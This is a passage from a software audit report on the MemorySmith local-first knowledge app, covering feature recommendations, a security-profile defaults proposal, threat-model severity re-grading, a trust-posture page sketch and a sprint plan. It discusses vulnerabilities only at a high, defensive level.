"Decision template", "Architecture-decision template", "Person template" — pre-filled forms with structured fields.

#### F20. Hashtag autocomplete in markdown editors
Type `#` → autocomplete from existing tags. Already partially exists for memory tags; extend to all markdown editors.

#### F21. Memory search shortcuts/saved queries
"My recently-updated work memories" as a one-click saved query.

#### F22. Inline TODO extraction from page markdown
`- [ ] do thing` in a page → auto-creates a task linked back to the page.

#### F23. Bring-your-own-LLM plugin pattern
Currently Ollama + GitHub Copilot are hardcoded as `IChatProvider`. A plugin pattern would let advanced users register their own (Anthropic, OpenAI, Mistral, llama.cpp server, vLLM endpoint).

#### F24. Provider-native tool calling (Audit #1 §5.9 / Audit #2 §15)
Already in the roll-up. Eliminates the entire family of `ReadToolCalls` brittleness when the provider supports native tools.

#### F25. AST-aware chunking via Roslyn for code search (Audit #1 §3.4 / Audit #4 §4.7)
Already in the roll-up. The biggest code-search precision win available.

#### F26. Cross-encoder reranker stage (Audit #4 §4.6)
Already in the roll-up. The benchmark harness is ready; this is the obvious next gain.

#### F27. Real ANN backend (sqlite-vec or HNSW.Net — Audit #4 §4.8)
Already in the roll-up. The runway from the SQL prefilter buys ~6 months; this is the durable answer.

---

## 4. Configurability-as-Security: A Proposed Refactor

The user's brief explicitly asks for configurability as a security strategy. Below is a concrete proposal: the `SecurityProfile` mechanism that already exists in stub form (`MemorySmithSecurityProfiles.cs` lists `LocalDev`, `SecureLocal`, `RemoteHardened`) should drive a tree of defaults.

### 4.1 Profile tree (proposed)

```
SecureLocal (default)              ← single-user local-first; trust the user, distrust the network
├── Chat.HistoryLocalStorageEnabled = true (user owns the box)
├── Chat.ClipboardFetchExternalImagesEnabled = false (clipboard is attacker-controlled surface)
├── Maintenance.DeduplicateRecordsEnabled = false (destructive, hide behind explicit opt-in)
├── Markdown.MermaidEnabled = true
├── Markdown.GenericAttributesEnabled = false (XSS surface)
├── Auth.OpenLocalEditorCompatibility = true (single-user, no admin yet ok)
├── Mcp.Enabled = true
└── Diagnostics.ExposeNetworkEndpoints = false (already private)

LocalDev                            ← active development on the host
├── (above) +
├── Auth.AllowAnonymousReadAll = true (faster iteration)
├── Auth.OpenLocalEditorCompatibility = true
├── Markdown.GenericAttributesEnabled = true (test all rendering paths)
└── Diagnostics.ExposeNetworkEndpoints = true (debugging)

RemoteHardened                      ← exposed beyond loopback
├── (SecureLocal) +
├── AllowRemoteApi = true (requires explicit choice)
├── ApiKey required
├── Auth.OpenLocalEditorCompatibility = false
├── Auth.RequireMfa = true (future feature)
├── Cookie.SecurePolicy = Always
├── Cookie.ExpireTimeSpan = 7 days
├── OnValidatePrincipal = wired
├── Audit.HashChainKeyMode = "Hmac" (requires F28 below)
├── Maintenance.DirectWriteEnabled = false (proposals only)
├── Chat.ClipboardFetchExternalImagesEnabled = false (forced)
├── Markdown.AllowRawHtml = false (forced)
├── Markdown.MermaidEnabled = false (forced)
└── Diagnostics.ExposeNetworkEndpoints = false (forced)
```

### 4.2 Implementation pattern

Each option's effective value is computed as:
1. Explicit user override (if present)
2. SecurityProfile default
3. Hardcoded code default

Wire this through `MemorySmithLocalDevelopmentPostConfigure` (which already exists for the LocalDev profile) — extend it to `MemorySmithSecureLocalPostConfigure` and `MemorySmithRemoteHardenedPostConfigure`.

### 4.3 The `OperationalDiagnosticsService` should show the active posture

Already partially does — `EffectiveMemorySmithConfiguration.SecurityProfile`. Extend to surface "which options are sourced from the profile vs explicit override". An admin can see "AllowRemoteApi: true (from RemoteHardened profile)" vs "AllowRemoteApi: true (explicit override)".

---

## 5. Threat Model Calibration Against the User's Brief

The user said "local-first, small actor, not likely to be widely accessible — but trustworthy enough for the user to run on their system." That sets the calibration. With that framing, the prior audits' Critical findings get re-graded:

| Prior finding | Audit #1-#4 severity | Calibrated to user's threat model |
|---|---|---|
| Loopback unauthenticated `/mcp` and `/api` | Critical | Medium (single-actor, but cross-process risk remains — a malicious VS Code extension or browser-tab JS could reach loopback) |
| Audit hash chain unsigned | Critical | Medium-High (the user as adversary scenario doesn't apply; but a compromised process on the box can rewrite history undetected) |
| Cookie hardening missing | Critical | Medium (only matters if the user exposes the app remotely) |
| OpenLocalEditorCompatibility default | Critical | Low (intended behavior; the bootstrap window is short) |
| `FileMemoryStore.Save` status-change deletion order | Critical | High (still real data loss on crash regardless of threat model) |
| No fsync uniformly | Critical | High (same reasoning) |
| `SanitizeId` regex incomplete | Critical | Medium (path traversal via memory ID requires content-write access which is already authenticated) |
| `MaintenanceProposalStore.ApplyAsync` non-atomic | Critical | High (data corruption regardless of threat model) |
| `MaintenanceProposalStore.SaveAsync` | Critical | High (same) |
| `ReadToolCalls` accepts arbitrary JSON | Critical | High (prompt injection from wiki content is a real local-actor concern) |
| `MaintenanceTasks.DeduplicateRecords` (Audit #4 §6.1) | High | High (escalated — destructive default doesn't fit "trustworthy") |
| Clipboard external fetch (Audit #5 §1.1) | High | High (surprising side effect on paste) |
| Mermaid `innerHTML` (Audit #2 §4.2 / Audit #5 §1.3) | High | Medium-High (content is mostly user-authored, so injection vector is wiki-content → chat-render, which requires an editor account) |
| Markdig `GenericAttributes` (Audit #2 §4.1) | High | Medium-High (same chain) |
| `WordPieceTokenizer` BERT-spec gaps (Audit #3 §4.1-4.3) | High | Medium (correctness-only for non-English; the maintainer's content is English) |
| 1-second polling (Audit #3 §2.1) | Critical | Low-Medium (waste, not a security issue; calibrated down) |
| DST scheduler (Audit #3 §2.2) | High | Low (waste, not a security issue) |

The calibration matters because it tells the maintainer **which findings to fix first under their actual threat model**:

**Calibrated P0 (data integrity + local actor compromise):**
1. `FileMemoryStore.Save` status-change deletion order
2. No fsync on file writes uniformly
3. `MaintenanceProposalStore.ApplyAsync` multi-file atomicity
4. `MaintenanceTasks.DeduplicateRecords` destructive default
5. `ReadToolCalls` strict envelope

**Calibrated P1 (real local-actor surface):**
6. Clipboard external fetch toggle
7. Markdig `GenericAttributes` disabled by default
8. Audit hash chain HMAC (the user trusts the box but the disk image risk is real)
9. `Mcp.Enabled` and `Chat.Enabled` toggles
10. Cookie hardening (if any remote exposure is planned)

**Calibrated P2 (productivity / correctness):**
- The vector/code-search recommendations from Audit #4
- WordPiece tokenizer BERT compliance
- All the missing/killer features from §3

The maintainer should think of P0 as "I can lose data tomorrow"; P1 as "an attacker who can get content past me to my wiki can compromise my session"; P2 as "this will get better as I scale and use more of the system."

---

## 6. Trust Posture — What MemorySmith Could Tell the User

A small but impactful feature: an explicit "Trust Posture" page that shows the user what their current configuration trusts.

### 6.1 Sketch

`/security/posture` (gated to Admin):

```
═══ Trust Posture ═══

Profile: SecureLocal
Posture summary: ★★★★☆ (4/5)

Network surface:
  ✓ Remote API: Disabled (`AllowRemoteApi=false`)
  ✓ MCP exposed only on loopback
  ⚠ Auth cookie SecurePolicy: not Always (recommend enable)

Content rendering:
  ✓ AllowRawHtml: Disabled
  ⚠ Markdig GenericAttributes: Enabled (can inject event handlers)
  ⚠ Clipboard external fetch: Enabled
  ⚠ Mermaid SVG: innerHTML rendered (XSS surface if Mermaid 11.x has a CVE)

Data at rest:
  ✗ At-rest encryption: not configured (memory contents plaintext on disk)
  ⚠ Audit hash chain: SHA-256 only (recoverable to tampering)
  ✓ Atomic file writes: partial (some stores)
  ✗ Backup configured: none

Automated behaviors:
  ⚠ Maintenance.DeduplicateRecords: ENABLED — silently merges by Title
  ✓ Maintenance.AutomaticDeprecation: Disabled
  ⚠ Chat.AgentWritesEnabled: Disabled (good) — but auto_accept available
  ⚠ Maintenance.DirectWrite: Disabled (good)

Surface area:
  Active subsystems: Chat (Ollama+Copilot), Memories, Pages, Tasks, MCP, Maintenance Agent, Code Search
  External services in use: Ollama (localhost:11434), GitHub OAuth (configured)
  Total tool surface: 22 MCP tools

[Switch profile: SecureLocal / RemoteHardened / LocalDev]
[Apply hardened defaults] [Export posture report]
```

### 6.2 Why this matters

A user who installs MemorySmith should be able to look at one page and understand exactly what they're agreeing to. The current config-via-`/admin/settings` route requires the user to know what to look for. The Trust Posture page is the inverse: "here's what's on by default, here's what we recommend, here's the one-click way to harden."

**Effort:** ~2 days. Reuses `OperationalDiagnosticsService.GetSnapshot` and the proposed SecurityProfile tree.

---

## 7. A Concrete Sprint Proposal

If I were the maintainer next Monday, this is the order I'd land changes:

### Sprint A — "Don't lose my data" (2-3 days)
1. `SafeFileWriter` utility (temp + fsync + atomic rename + multi-file journal).
2. Apply to: `FileMemoryStore`, `FileVarStore`, `FileEventStore`, `FileMaintenanceProposalStore`, `TagPolicyService.SavePolicy`.
3. Fix `FileMemoryStore.Save` status-change order (write new before deleting old).
4. Gate `MaintenanceTasks.DeduplicateRecords` behind `Maintenance.DeduplicationEnabled = false` default.
5. Add storage diagnostics persistence (so corrupt-file events survive restart).

### Sprint B — "Don't surprise me" (2-3 days)
1. `Chat.ClipboardFetchExternalImagesEnabled = false` default with opt-in flag.
2. Markdig pipeline: drop `GenericAttributes`; pipe output through `Ganss.Xss.HtmlSanitizer`.
3. Mermaid: pin version, pass through DOMPurify.
4. Add CSP middleware with sensible default.
5. Cookie hardening (SecurePolicy, ExpireTimeSpan, OnValidatePrincipal).

### Sprint C — "Make the killer features happen" (1-2 weeks)
1. Spotlight command palette.
2. Inline citations with confidence.
3. Connection suggestions (AI cross-link proposals).
4. Frictionless capture flow.
5. Knowledge graph interactive viewer.

### Sprint D — "MCP completeness" (2-3 days)
1. MCP `resources` capability backed by memory records + pages.
2. MCP `prompts` capability backed by the prompt files.
3. Document the integrations for Claude Desktop, Cursor, VS Code Continue.

### Sprint E — "Code search done right" (1-2 weeks)
1. `TensorPrimitives.Dot` SIMD.
2. FP16 BLOB storage.
3. Microsoft.ML.Tokenizers BertTokenizer swap (closes the WordPiece BERT-spec gaps AND enables BPE for nomic-embed-code).
4. AST-aware chunking via Roslyn.
5. Cross-encoder reranker.

### Sprint F — "Trust posture" (1 day)
1. The Trust Posture page (§6).
2. `SecurityProfile`-driven defaults wiring.

That's ~5-6 weeks of focused work. After it, MemorySmith is meaningfully better at every dimension the user cares about — and the "trust me, run me on your box" pitch is supportable.

---

## 8. Verdict

Audits #1-#3 found a lot of bugs. Audit #4 graded the remediation work (excellent process, narrow scope). Audit #5 finds the rest of the surface — the JS interop layer, the markdown rendering chain, the prompt files, the diagnostic exposure — and adds:

- **0 Critical, 4 High, 9 Medium, 7 Low** in fresh bugs (20 new findings).
- **23 configurability gaps** where a behavior should have an off-switch.
- **27 missing-feature recommendations** ranked Tier 1 / Tier 2 / Tier 3.

The cumulative picture across five audits: **198 distinct findings**. **7 closed** by the maintainer's remediation work. **3 tracked** as open tasks. **The remaining ~188 are correlated:** they share a small number of architectural patterns — file writes that don't fsync, regex-based defenses that miss attribute injection, hand-rolled tokenizers that drift from spec, magic-number heuristics that aren't measurement-grounded, subsystems that lack on/off switches.

For a "local-first single-actor app that the user should trust enough to run safely," the path forward is in §7 — five sprints, in order, with measurable gates at each. The maintainer's response pattern to Audit #1 (publish to wiki as research input, file tasks, ship targeted PRs with tests and benchmarks) is a template for the next five sprints.

The product is approximately one Spotlight palette + inline citations + connection suggestions + capture flow away from being the obvious tool for a developer who wants a private second-brain. That's a small list of high-impact work, all of which fits within the local-first single-actor framing.

---

## 9. Combined Severity Rollup Across All Five Audits

| Severity | Audit #1 | Audit #2 (net) | Audit #3 (net) | Audit #4 (net) | Audit #5 (net) | Closed by remediation | Currently open |
|---|---:|---:|---:|---:|---:|---:|---:|
| Critical | 8 | 2 | 1 | 1 | 0 | 0 | 12 |
| High | 22 | 11 | 8 | 5 | 4 | 4 | 46 |
| Medium | 33 | 18 | 17 | 15 | 9 | 2 | 90 |
| Low | 14 | 9 | 13 | 8 | 7 | 1 | 50 |
| **TOTAL** | **77** | **40** | **39** | **29** | **20** | **7** | **198** |

Plus 23 configurability gaps and 27 missing-feature recommendations new in Audit #5.

---

## 10. Assumptions and Open Questions

**Assumptions:**
- E1: The maintainer's stated threat model ("local-first single-actor app, not widely accessible") is the calibration bar.
- E2: The user values capture-friction reduction, trust signals (citations), and knowledge-graph organization as much as raw chat quality.
- E3: A `SecurityProfile`-driven config tree is the intended end state given the existing `MemorySmithSecurityProfiles` constants.

**Open questions:**
- TT1: Is the goal to support a public MCP server / multi-user mode in the future? If yes, the calibration in §5 changes.
- TT2: Should `Maintenance.DeduplicateRecords` be removed entirely, gated, or replaced with a proposal-workflow path? Removing is safest; gating preserves the feature.
- TT3: Is the Mermaid CDN intentional, or is bundling it acceptable for the local-first deployment story?
- TT4: Which killer features from §3 would the maintainer prioritize first?

---

## 11. Limits of This Audit

I did not:
- Read every line of Chat.razor (2997 LOC) — sampled the render path.
- Read every line of Admin.razor (1853 LOC) — sampled.
- Read MaintenanceAgent prompt files in full — sampled the proposal-generation prompt.
- Stand up the app and exercise the clipboard fetch flow live.
- Test the Mermaid `innerHTML` injection with a known XSS payload.
- Verify the e2e suite coverage against the new feature recommendations.
- Inspect the GitHub Actions workflows in Audit #5 (covered in #3).
- Build a working prototype of any of the missing features.

I did:
- Read the full `memorysmith.js` (951 LOC) including all `fetch`, `innerHTML`, and DOM manipulation paths.
- Read `SafeJsInterop.cs` end-to-end.
- Read `ChatReferenceLinkPolicy.cs` (288 LOC) end-to-end.
- Read `MeasurementBaselineService.cs` and `OperationalDiagnosticsService.cs`.
- Read the chat agent prompt and the maintenance proposal generation prompt.
- Read the e2e Playwright tests (sampled both spec files).
- Cross-reference every new finding against the prior four audits.
- Calibrate the prior-audit severities against the user's explicit threat model.

---

*End of Audit #5. ~10,800 words. 14 pages at standard typesetting.*

## Cross-Audit Reading Path (Updated)

- **Audit #1** (~9,500 words): strategic sweep.
- **Audit #2** (~9,700 words): verifications + maintenance agent / governance / state machine.
- **Audit #3** (~6,200 words): SQLite verification + background services / scheduler / tokenizer.
- **Audit #4** (~10,400 words): remediation review of `feature/code-search-high-roi-batch8` + deep dive on code search.
- **Audit #5 (this report)** (~10,800 words): JS interop + markdown rendering + prompts + configurability-as-security + missing/killer features.

Combined: ~46,600 words. 198 distinct findings. 7 closed. 3 tracked. The §7 sprint proposal is the single best place to start.
